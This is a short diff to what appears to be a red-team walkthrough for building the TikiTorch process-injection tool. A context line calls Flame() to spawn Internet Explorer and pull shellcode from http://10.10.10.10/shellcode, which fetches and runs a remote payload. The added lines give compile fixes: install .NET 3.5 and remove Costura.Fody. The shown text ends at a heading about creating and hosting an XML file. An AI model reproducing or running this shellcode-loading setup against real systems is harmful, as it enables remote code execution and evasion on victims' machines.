@@ -14,7 +14,9 @@
     Flame(@"C:\Program Files\Internet Explorer\iexplore.exe", @"http://10.10.10.10/shellcode"); 
 - Compile TikiTorch using .Net Framework by clicking on the TikiTorch.sln file
     If errors are encountered while compiling you may need to install additional NuGet packages
+      Ensure Microsoft .Net 3.5 is installed in Program and Features
       In .Net Framework select Project -> Manage NuGet Packages
+        Uninstall Costura.Fody,and Fody from Update. You should only need NDesk.Options        
 - We will only be using the Tikispawn.dll file from the TikiTorch package
 
 #CREATE/HOST XML FILE
